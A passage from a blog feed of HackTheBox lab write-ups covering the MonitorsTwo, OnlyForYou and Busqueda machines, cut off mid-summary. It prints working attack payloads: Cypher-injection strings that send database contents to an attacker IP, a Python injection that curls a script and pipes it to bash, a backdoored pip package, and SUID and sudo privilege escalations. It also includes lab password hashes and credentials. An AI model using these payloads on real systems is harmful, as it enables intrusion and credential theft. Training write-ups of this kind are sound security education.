+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Cracked that of <code class="language-plaintext highlighter-rouge">marcus</code> successfully;</p>

<p><img src="/assets/img/Pasted image 20230830135710.png" alt="" /></p>

<p>This gave me access to the main host over SSH;</p>

<p><img src="/assets/img/Pasted image 20230830140527.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">marcus</code> does not have sudo perms, and is also not in any special group. File system enum showed we have execute permission on <code class="language-plaintext highlighter-rouge">/var/lib/docker</code>, which means we can enter the directory;</p>

<p><img src="/assets/img/Pasted image 20230830140233.png" alt="" /></p>

<p>Searching about how this could be exploited lead me to <a href="https://github.com/UncleJ4ck/CVE-2021-41091">CVE-2021-41091</a>;</p>
<blockquote>
  <p>CVE-2021-41091 is a flaw in Moby (Docker Engine) that allows unprivileged Linux users to traverse and execute programs within the data directory (usually located at /var/lib/docker) due to improperly restricted permissions. This vulnerability is present when containers contain executable programs with extended permissions, such as setuid. Unprivileged Linux users can then discover and execute those programs, as well as modify files if the UID of the user on the host matches the file owner or group inside the container.</p>
</blockquote>

<p>For this exploit to work though, we need to be <code class="language-plaintext highlighter-rouge">root</code> in one of the docker containers on the host. So I went back in as <code class="language-plaintext highlighter-rouge">www-data</code> using the previous <em>Cacti</em> RCE. Searching for SUIDs gave an interesting result;</p>

<p><img src="/assets/img/Pasted image 20230830141647.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">capsh</code> is a utility for managing capabilities/perms. Using <code class="language-plaintext highlighter-rouge">capsh --gid=0 --uid=0 --</code> (from <a href="https://gtfobins.github.io">gtfobins</a>), I was elevated to <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230830143748.png" alt="" /></p>

<p>I then setup SUID on <code class="language-plaintext highlighter-rouge">/bin/bash</code>, then ran the exploit again, which gave me root on main;</p>

<p><img src="/assets/img/Pasted image 20230830144138.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP showed port <strong>22</strong> and <strong>80</strong></li>
  <li>Web server running an instance of <em>Cacti v1.2.22</em>, which is vulnerable to <strong>CVE-2022-46169</strong> (RCE)</li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">capsh</code> SUID allowed me to elevate to <code class="language-plaintext highlighter-rouge">root</code></li>
      <li>Obtained and crack the hash of <code class="language-plaintext highlighter-rouge">marcus</code> from local MySQL, which gave me a shell on the main box.</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">marcus</code>;
    <ul>
      <li>Global execute permission on <code class="language-plaintext highlighter-rouge">/var/lib/docker</code> (CVE-2021-41091)</li>
      <li>Exploit it to gain code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="easy" /><category term="web" /><category term="cacti" /><category term="cve" /><category term="capsh" /><category term="mysql" /><category term="docker" /><summary type="html"><![CDATA[MonitorsTwo is an easy linux box that starts with exploiting a vulnerable instance of Cacti to gain a shell on the box. This drops you into a docker container that has SUID set on capsh, which allows for easy privesc. You then move laterally to the main host by cracking a hash obtained from a local MySQL server, and then exploit CVE-2021-41091 to gain root on the box.]]></summary></entry><entry><title type="html">OnlyForYou - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/only4you.html" rel="alternate" type="text/html" title="OnlyForYou - HackTheBox" /><published>2023-08-26T00:00:00+01:00</published><updated>2023-08-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/only4you</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/only4you.html"><![CDATA[<p><strong>OnlyForYou</strong> is a medium linux box on <em>HackTheBox</em>. It starts with exploiting an LFI vulnerability to leak application source code, which reveals a code injection vulnerability. Once inside the box, you setup a tunnel to a local web app that’s vulnerable to <em>Cypher Injection</em>. Privesc is through a sudo permission on <code class="language-plaintext highlighter-rouge">pip3 download</code>.</p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230819232132.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230819232206.png" alt="" /></p>

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 19 12:04:50 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.210
Nmap scan report for 10.10.11.210
Host is up (0.39s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 19 12:06:02 2023 -- 1 IP address (1 host up) scanned in 72.40 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>NMAP showed port 80 is redirecting to <code class="language-plaintext highlighter-rouge">http://only4you.htb</code>, so I added it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>

<p><img src="/assets/img/Pasted image 20230819232903.png" alt="" /></p>

<p>Most of the links in the page are dead, but there is a contact-us form at the bottom;</p>

<p><img src="/assets/img/Pasted image 20230819233021.png" alt="" /></p>

<p>Filling the form and clicking the send button generated a POST request;</p>

<p><img src="/assets/img/Pasted image 20230819233313.png" alt="" /></p>

<p>Tampering with the parameters a little showed an error, which confirms the server is processing the request;</p>

<p><img src="/assets/img/Pasted image 20230819233445.png" alt="" /></p>

<p>The FAQ section linked to another subdomain, <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230819233716.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230819233827.png" alt="" /></p>

<p>The <em>Source Code</em> button links to <code class="language-plaintext highlighter-rouge">http://beta.only4you.htb/source</code>, which start a download for <code class="language-plaintext highlighter-rouge">source.zip</code>. The source code of the web app is found inside (it’s a flask web app);</p>

<p><img src="/assets/img/Pasted image 20230819234154.png" alt="" /></p>

<p>Nothing of interest was found in the implementation of both image conversion and resizing featured by the site. Further look revealed a function named <code class="language-plaintext highlighter-rouge">download()</code> that handles POST requests to the <code class="language-plaintext highlighter-rouge">/download</code> route. This function is vulnerable to LFI through the <code class="language-plaintext highlighter-rouge">image</code> parameter;</p>

<p><img src="/assets/img/Pasted image 20230819234721.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230819235052.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>We already have the source code of <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code>, but not that of the main domain <code class="language-plaintext highlighter-rouge">only4you.htb</code>. Since the sites are running behind <em>Nginx</em> as indicated in the <em>server</em> response header, I read the default <em>Nginx</em> config file at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code>, which revealed the web root of <code class="language-plaintext highlighter-rouge">only4you.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230819235544.png" alt="" /></p>

<p>Since <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code> is a flask app, I checked for <code class="language-plaintext highlighter-rouge">app.py</code> in the web root of <code class="language-plaintext highlighter-rouge">only4you.htb</code>, and it exists. The <code class="language-plaintext highlighter-rouge">app.py</code> file imported <code class="language-plaintext highlighter-rouge">sendmessage</code> from a module named <code class="language-plaintext highlighter-rouge">form</code> (<code class="language-plaintext highlighter-rouge">form.py</code>), which was also dumped;</p>

<p><img src="/assets/img/Pasted image 20230820000138.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230820000422.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230820000332.png" alt="" /></p>

<p>Notice how the <code class="language-plaintext highlighter-rouge">issecure()</code> function is using a loose regex to filter the email address, before passing the domain part (everything after <code class="language-plaintext highlighter-rouge">@</code>) to a <code class="language-plaintext highlighter-rouge">subprocess.run()</code>, which is used for executing shell command. This makes it vulnerable to <em>code injection</em>, which I exploited to gain a shell on the box as the user <code class="language-plaintext highlighter-rouge">www-data</code>;</p>

<p><img src="/assets/img/Pasted image 20230820000947.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230820001024.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>There are <strong>2</strong> user accounts on the box;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>www-data@only4you:/dev/shm$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
www-data@only4you:/dev/shm$ 
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Some Interesting service running locally;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>www-data@only4you:~/only4you.htb$ ss -ltn
State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port  Process  
LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*              
LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*              
LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*              
LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*              
LISTEN  0       4096              127.0.0.1:3000         0.0.0.0:*              
LISTEN  0       2048              127.0.0.1:8001         0.0.0.0:*              
LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*              
LISTEN  0       50       [::ffff:127.0.0.1]:7474               *:*              
LISTEN  0       128                    [::]:22              [::]:*              
LISTEN  0       4096     [::ffff:127.0.0.1]:7687               *:*              
www-data@only4you:~/only4you.htb$
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So I uploaded <code class="language-plaintext highlighter-rouge">chisel</code> and setup a reverse tunnel for port <code class="language-plaintext highlighter-rouge">3000</code> and <code class="language-plaintext highlighter-rouge">8001</code>;</p>

<p><img src="/assets/img/Pasted image 20230820002041.png" alt="" /></p>

<p>This opens up port <code class="language-plaintext highlighter-rouge">3000</code> and <code class="language-plaintext highlighter-rouge">8001</code> on my box and proxied them to the box through the reverse connection. Loading up port <code class="language-plaintext highlighter-rouge">3000</code> showed an instance of <em>Gogs</em>;</p>

<p><img src="/assets/img/Pasted image 20230820002330.png" alt="" /></p>

<p>Port <code class="language-plaintext highlighter-rouge">8001</code> seems to be hosting some custom web app;</p>

<p><img src="/assets/img/Pasted image 20230820002422.png" alt="" /></p>

<p>Trying some common defaults, I got in using <code class="language-plaintext highlighter-rouge">admin:admin</code>;</p>

<p><img src="/assets/img/Pasted image 20230820002518.png" alt="" /></p>

<p>The <em>employees</em> tab has a search feature that throws a <strong>500</strong> error after adding a single quote in the search query;</p>

<p><img src="/assets/img/Pasted image 20230820002709.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230820002826.png" alt="" /></p>

<p>This indicates a possible SQL injection, so I passed it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, which flag it as vulnerable, but was not able to detect the type of database management system (DBMS) in use;</p>

<p><img src="/assets/img/Pasted image 20230820003426.png" alt="" /></p>

<p>The payload looks like a MySQL query to me, but supplying it using the <code class="language-plaintext highlighter-rouge">--dbms=MySQL</code> flag didn’t work. There is a checklist in the dashboard that might explain this;</p>

<p><img src="/assets/img/Pasted image 20230820004015.png" alt="" /></p>

<p>The <em>neo4j’s</em> equivalent of <em>SQL injection</em> is called <em>Cypher Injection</em>. Using the cheatsheet at <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">hacktricks</a>, I was able to dump available labels with the OOB payload;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.73/?l='+label as l RETURN 0 as _0 //
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230824083333.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">user</code> label looks interesting. Dumping it with the payload;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>a' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.73/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I got the hash of <strong>2</strong> users;</p>

<p><img src="/assets/img/Pasted image 20230824083518.png" alt="" /></p>

<p>This looks like a SHA256 hash. We already know the password of <code class="language-plaintext highlighter-rouge">admin</code>, so no need to crack it. Saving the hash of <code class="language-plaintext highlighter-rouge">john</code> into a file, I was able to crack it using <em>John the Ripper</em>;</p>

<p><img src="/assets/img/Pasted image 20230824083815.png" alt="" /></p>

<p>Local user <code class="language-plaintext highlighter-rouge">john</code> exists on the box, so I tried to login over SSH, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230824084039.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><strong>john</strong> has a <code class="language-plaintext highlighter-rouge">sudo</code> permission configured;</p>

<p><img src="/assets/img/Pasted image 20230820012935.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">download</code> argument is used to tell <code class="language-plaintext highlighter-rouge">pip</code> to download and install a python package. This is interesting as this could allow for a straightforward RCE, but we must supply a link that starts with <code class="language-plaintext highlighter-rouge">http://127.0.0.1:3000/</code> and ends with <code class="language-plaintext highlighter-rouge">.tar.gz</code>. <em>Gogs</em> is already running on this port. Trying the creds of <code class="language-plaintext highlighter-rouge">john:ThisIs4You</code> allowed me to login;</p>

<p><img src="/assets/img/Pasted image 20230820013418.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">Test</code> repo is private, and has nothing of interest. However, we could exploit the <code class="language-plaintext highlighter-rouge">sudo</code> perm by uploading a backdoored python package on the repo, make the repo public so it can be directly accessed externally, and then pass the direct URL to the call to <code class="language-plaintext highlighter-rouge">sudo pip3 download &lt;url&gt;</code>.</p>

<p>I got a minimal python package with no dependencies (which is important as HTB boxes are not connected to the internet, which will be required to resolve unmet dependencies) at <a href="https://pypi.org/project/hello-world-20200509/">pypi</a>. I extracted the archive with;</p>

<p><img src="/assets/img/Pasted image 20230820014206.png" alt="" /></p>

<p>Our file of interest is <code class="language-plaintext highlighter-rouge">setup.py</code>, which is what will be executed during installation. I edited it and add a bash reverse shell;</p>

<p><img src="/assets/img/Pasted image 20230820014345.png" alt="" /></p>

<p>I then packaged it back as <code class="language-plaintext highlighter-rouge">backdoored.tar.gz</code> and upload it to the <code class="language-plaintext highlighter-rouge">Test</code> repo;</p>

<p><img src="/assets/img/Pasted image 20230820065003.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230820062711.png" alt="" /></p>

<p>I then made the repo public;</p>

<p><img src="/assets/img/Pasted image 20230820062948.png" alt="" /></p>

<p>I then copied the raw URL, which is <code class="language-plaintext highlighter-rouge">http://127.0.0.1:3000/john/Test/raw/master/backdoored.tar.gz</code></p>

<p><img src="/assets/img/Pasted image 20230820062811.png" alt="" /></p>

<p>I then passed the link to <code class="language-plaintext highlighter-rouge">sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/backdoored.tar.gz</code>, which gave me a shell on the box as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230820063920.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP showed port <strong>22</strong> and <strong>80</strong> listening.</li>
  <li>Analysed the source code for <code class="language-plaintext highlighter-rouge">beta.only4you.htb</code> to find an LFI</li>
  <li>Used it to dump the source of <code class="language-plaintext highlighter-rouge">only4you.htb</code> and identify a <em>code injection</em> vulnerability, which gave me a shell as <code class="language-plaintext highlighter-rouge">www-data</code></li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Setup a tunnel to local services using <code class="language-plaintext highlighter-rouge">chisel</code></li>
      <li>Found a <em>cypher injection</em> vulnerability on the service on port <code class="language-plaintext highlighter-rouge">8001</code></li>
      <li>Exploited it to get the creds of <code class="language-plaintext highlighter-rouge">john</code> for SSH and Gogs access</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">john</code>;
    <ul>
      <li>Leveraged access to <em>Gogs</em> to exploit a <code class="language-plaintext highlighter-rouge">sudo</code> permission on <code class="language-plaintext highlighter-rouge">pip3 download</code> to download and execute a backdoored python archive as <code class="language-plaintext highlighter-rouge">root</code>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="medium" /><category term="linux" /><category term="lfi" /><category term="rce" /><category term="nginx" /><category term="flask" /><category term="chisel" /><category term="tunneling" /><category term="neo4j" /><category term="cypher injection" /><category term="pip" /><summary type="html"><![CDATA[OnlyForYou is a medium linux box on HackTheBox. It starts with exploiting an LFI vulnerability to leak application source code, which reveals a code injection vulnerability. Once inside the box, you setup a tunnel to a local web app that’s vulnerable to Cypher Injection. Privesc is through a sudo permission on pip3 download.]]></summary></entry><entry><title type="html">Busqueda - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/busqueda.html" rel="alternate" type="text/html" title="Busqueda - HackTheBox" /><published>2023-08-12T00:00:00+01:00</published><updated>2023-08-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/busqueda</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/busqueda.html"><![CDATA[<p><strong>Busqueda</strong> is a nice easy linux machine on <em>HackTheBox</em>. It starts with a web application that’s vulnerable to <em>RCE</em>. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a <em>Gitea</em> instance. Privesc is by exploiting a custom script with sudo perms.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230812065633.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812065716.png" alt="" /></p>

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Mon Jul 31 06:51:57 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.208
Increasing send delay for 10.10.11.208 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Increasing send delay for 10.10.11.208 from 10 to 20 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.11.208 from 20 to 40 due to 11 out of 15 dropped probes since last increase.
Nmap scan report for 10.10.11.208
Host is up (0.50s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 31 06:53:07 2023 -- 1 IP address (1 host up) scanned in 70.24 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Server redirects to <code class="language-plaintext highlighter-rouge">searcher.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230812071854.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812072012.png" alt="" /></p>

<p>Site is running <em>Searchor v2.4.0</em>, which is available on <a href="https://github.com/ArjunSharda/Searchor">GitHub</a></p>

<p><img src="/assets/img/Pasted image 20230812072417.png" alt="" /></p>

<p>Entering a simple search term returns a link;</p>

<p><img src="/assets/img/Pasted image 20230812072919.png" alt="" /></p>

<p>The request made;</p>

<p><img src="/assets/img/Pasted image 20230812073004.png" alt="" /></p>

<p>When testing the <code class="language-plaintext highlighter-rouge">query</code> parameter, the endpoint is behaving differently whenever a single quote <code class="language-plaintext highlighter-rouge">'</code> is entered;</p>

<p><img src="/assets/img/Pasted image 20230812073232.png" alt="" /></p>

<p>Suspected SQL injection, but none of the usual payloads seems to work. I installed <em>Seachor</em> locally for testing;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.tar.gz
<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xvf</span> v2.4.0.tar.gz
<span class="nv">$ </span><span class="nb">cd </span>Searchor-2.4.0
<span class="nv">$ </span><span class="nb">sudo </span>python3 setup.py <span class="nb">install</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The README shows how the program is used. It has a module you can import and use in python, and also a CLI version. The module seems to handle single quotes well when called from a python REPL;</p>

<p><img src="/assets/img/Pasted image 20230812074023.png" alt="" /></p>

<p>However, the CLI tool provided gave an error;</p>

<p><img src="/assets/img/Pasted image 20230812074204.png" alt="" /></p>

<p>Notice how the <code class="language-plaintext highlighter-rouge">'</code> in the call to <code class="language-plaintext highlighter-rouge">Engine.Accuweather.Search</code> is not balanced, and we were able to escape the quotation. This indicates our query is injected directly into a python code used to call the library. Testing this, we got code execution;</p>

<p><img src="/assets/img/Pasted image 20230812074648.png" alt="" /></p>

<p>Testing on the box, I was unable to execute a bash rev shell directly. Had to curl it from my box, but it worked, and I got in as the user <code class="language-plaintext highlighter-rouge">svc</code>;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>engine=Accuweather&amp;query=',exec("import os; os.system('curl 10.10.16.10/rev.sh | /bin/bash')"),'
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230812075857.png" alt="" /></p>

<p>User flag was found in <code class="language-plaintext highlighter-rouge">~/user.txt</code></p>

<hr />
<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Can’t check sudo perms for <code class="language-plaintext highlighter-rouge">svc</code> as we still don’t have his password. <code class="language-plaintext highlighter-rouge">.gitconfig</code> file was found in the home directory, which is what is used to configure <code class="language-plaintext highlighter-rouge">git</code>;</p>

<p><img src="/assets/img/Pasted image 20230812080610.png" alt="" /></p>

<p>Checking the web app root dir at <code class="language-plaintext highlighter-rouge">/var/www/app</code> showed a <code class="language-plaintext highlighter-rouge">.git</code> folder, indicating it’s a GIT repo. Running <code class="language-plaintext highlighter-rouge">git status</code> prompted us to add the directory as <em>safe</em> for git;</p>

<p><img src="/assets/img/Pasted image 20230812081017.png" alt="" /></p>

<p>Notice from the output above the repo is in sync with <code class="language-plaintext highlighter-rouge">origin/main</code>, which indicates an upstream has been configured. Listing the remote origins, a cred was revealed;</p>

<p><img src="/assets/img/Pasted image 20230812081319.png" alt="" /></p>

<p>This is the same username that was found in <code class="language-plaintext highlighter-rouge">/home/svc/.gitconfig</code>. Testing the password on the account, I was able to login over SSH. <code class="language-plaintext highlighter-rouge">sudo -l</code> reveals a sudo perm on a custom script;</p>

<p><img src="/assets/img/Pasted image 20230812081749.png" alt="" /></p>

<p>However I do not have read perms on the file;</p>

<p><img src="/assets/img/Pasted image 20230812081836.png" alt="" /></p>

<p>Further enum showed a local <em>apache2</em> VHOST in <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>;</p>

<p><img src="/assets/img/Pasted image 20230812082355.png" alt="" /></p>

<p>I setup an SSH tunnel to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code>, and was able to access it through my browser;</p>

<p><img src="/assets/img/Pasted image 20230812082507.png" alt="" /></p>

<p>We already have the password of the <code class="language-plaintext highlighter-rouge">svc</code> user. Trying it on the Gitea instance didn’t work. But earlier we saw <code class="language-plaintext highlighter-rouge">svc</code> using the name <code class="language-plaintext highlighter-rouge">cody</code> in <code class="language-plaintext highlighter-rouge">.gitconfig</code>. Trying <code class="language-plaintext highlighter-rouge">cody:jh1usoih2bkjaspwe92</code> allowed me to login;</p>

<p><img src="/assets/img/Pasted image 20230812082917.png" alt="" /></p>

<p>Nothing of interest was found, except for the admin user;</p>

<p><img src="/assets/img/Pasted image 20230812082820.png" alt="" /></p>

<p>Going back to the sudo script, it accepts 3 arguments;</p>

<p><img src="/assets/img/Pasted image 20230812083106.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">docker-ps</code> showed 2 docker containers running;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 29 minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 29 minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">docker-inspect</code> allows us to supply a <em>format</em> and <em>container</em> name. This is interesting because docker has an <code class="language-plaintext highlighter-rouge">inspect</code> command used to pull info from containers if we can supply a custom Go template;</p>

<p><img src="/assets/img/Pasted image 20230812083759.png" alt="" /></p>

<p>Trying a template that will print the docker configuration of a container worked, and we got a new MySQL cred;</p>

<p><img src="/assets/img/Pasted image 20230812083954.png" alt="" /></p>

<p>Remember <code class="language-plaintext highlighter-rouge">docker-ps</code> showed port <code class="language-plaintext highlighter-rouge">3306</code> (MySQL) is forwarded to the <code class="language-plaintext highlighter-rouge">mysql_db</code> container on the box. Was able to login successfully and get the hash of <code class="language-plaintext highlighter-rouge">administrator</code>;</p>

<p><img src="/assets/img/Pasted image 20230812084621.png" alt="" /></p>

<p>No need to crack this though as the password used for the Gitea MySQL database is also the password of the user <code class="language-plaintext highlighter-rouge">administrator</code>, and we now have access to a repo containing the source code of the sudo scripts;</p>

<p><img src="/assets/img/Pasted image 20230812085220.png" alt="" /></p>

<p>Going through the source code of <code class="language-plaintext highlighter-rouge">system-checkup.py</code>, the script is calling <code class="language-plaintext highlighter-rouge">run_command()</code> with a relative path;</p>

<p><img src="/assets/img/Pasted image 20230812085520.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812085542.png" alt="" /></p>

<p>This makes the script vulnerable to arbitrary code execution as we could simply create a file in our current directory named <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> and it wil be executed;</p>

<p><img src="/assets/img/Pasted image 20230812090108.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812090253.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap</code> found port 22 (OpenSSH) and 80 (Apache2)</li>
  <li>Werkzeug web app that uses <code class="language-plaintext highlighter-rouge">Searchor v2.4.0</code> to run searches
    <ul>
      <li>Exploited an RCE bug to gain a shell as <code class="language-plaintext highlighter-rouge">svc</code></li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">svc</code>;
    <ul>
